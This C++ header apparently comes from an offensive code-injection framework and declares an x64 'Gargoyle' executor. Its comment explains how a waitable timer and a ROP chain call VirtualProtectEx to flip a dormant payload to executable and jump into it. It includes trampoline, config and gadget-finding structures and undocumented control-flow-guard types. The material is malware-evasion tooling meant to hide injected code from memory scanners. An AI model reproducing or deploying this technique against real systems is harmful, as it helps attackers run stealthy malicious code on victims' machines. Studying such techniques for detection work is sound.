#pragma once
#include "executors/executor.h"
#include "memory_writers/memory_writer.h"
#include <windows.h>
// hopefully this is enough
#define STACK_SIZE 0x80000

/*
 * Works like this, basically:
 *
 * Gargoyle calls CreateWaitableTimer()
 * Gargoyle calls SetWaitableTimer(), such that when the timer is signalled, the
 * thread jumps to a ROP gadget that does:
 *
 * pop rcx
 * pop rsp
 * ret
 *
 * This pops the return address into rcx (just dumping it here), then pops the
 * argument to the timer completion routine into rsp
 * The argument we pass is an argument to the trampoline, so the stack then
 * points at the trampoline
 *
 * The trampoline does the following through ROP:
 *
 * pop rcx
 * ret
 * pop rdx
 * ret
 * pop r8
 * ret
 * pop r9
 * ret to VirtualProtectEx
 * pop rcx
 * ret to gargoyle
 *
 *
 * The stack trampoline is set up so that the first four arguments to
 * VirtualProtectEx get put in the rcx, rdx, r8, r9 registers, and the fifth
 * argument is below it on the stack. Then we call VirtualProtectEx to make our
 * gargoyle payload executable, then we pop the argument to gargoyle into
 * rcx, and ret to gargoyle
 *
 * We have to do this all different to the Gargoyle PoC because the Gargoyle PoC
 * is for x86, but we are on x64, and x64 no longer has __stdcall (all
 * parameters on stack)
 *
 * The `padding` attribute of the stack is a bit of a hack to ensure that
 * the stack stays 16-byte aligned. This makes the Trampoline 160 bytes
 * instead of 152, and thus the `stack` in the gargoyle argument is always
 * 16-byte aligned. This is needed because some instructions will throw an
 * exception if they try to read from non 16-byte-aligned addresses, and if this
 * is an address on the stack and the stack base is not 16-byte-aligned, they
 * will throw an exception An example of one of these instructions is movaps
 *
 */
struct Trampoline {
  DWORD_PTR pop_rcx_ret_ptr;
  DWORD_PTR proc_handle;
  DWORD_PTR pop_rdx_ret_ptr;
  DWORD_PTR addr;
  DWORD_PTR pop_r8_ret_ptr;
  DWORD_PTR size;
  DWORD_PTR pop_r9_ret_ptr;
  DWORD_PTR new_protection;
  DWORD_PTR VirtualProtectEx_ptr;
  DWORD_PTR add_rsp_30_ret_ptr;
  DWORD_PTR shadow_space1;
  DWORD_PTR shadow_space2;
  DWORD_PTR shadow_space3;
  DWORD_PTR shadow_space4;
  DWORD_PTR old_protection_ptr;
  DWORD_PTR padding;
  DWORD_PTR pop_rcx_ret_ptr2;
  DWORD_PTR gargoyle_arg_ptr;
  DWORD_PTR gargoyle_addr;
  DWORD_PTR padding2;
};

struct Config {
  DWORD_PTR initialized;
  DWORD_PTR pop_rcx_pop_rsp_ret;
  DWORD_PTR pop_rcx_ret;
  DWORD_PTR pop_rdx_ret;
  DWORD_PTR pop_r8_ret;
  DWORD_PTR add_rsp_30_ret;
  DWORD_PTR VirtualProtectEx_ptr;
  DWORD_PTR WaitForSingleObjectEx_ptr;
  DWORD_PTR timer_period;
  DWORD_PTR base_ptr;
  DWORD_PTR dll_size;
  DWORD_PTR timer_handle;
  DWORD_PTR dump;
  struct Trampoline tramp_copy;
};

struct GargoyleArgument {
  struct Config conf;
  BYTE stack[STACK_SIZE];
  struct Trampoline tramp;
};

typedef struct _VM_INFORMATION {
  DWORD_PTR num_offsets;
  PDWORD output;
  PCFG_CALL_TARGET_INFO offsets;
  DWORD_PTR unk1;
  DWORD_PTR unk2;
} VM_INFORMATION, *PVM_INFORMATION;

typedef struct _MEMORY_RANGE_ENTRY {
  PVOID VirtualAddress;
  SIZE_T NumberOfBytes;
} MEMORY_RANGE_ENTRY, *PMEMORY_RANGE_ENTRY;

struct rop_gadget {
  BYTE *instructions;
  SIZE_T instructions_size;
  const char *module_name;
  DWORD_PTR offset;
  DWORD_PTR module_base;
};

class Gargoyle : public Executor {
private:
  HMODULE load_module(MemoryWriter *mw, const char *dll_to_load);
  BOOL find_rop_gadget_offset(struct rop_gadget *gadget);

public:
  Gargoyle();
  ~Gargoyle();
  BOOL execute(MemoryWriter *mw, LPVOID data_to_write, DWORD data_size);
};
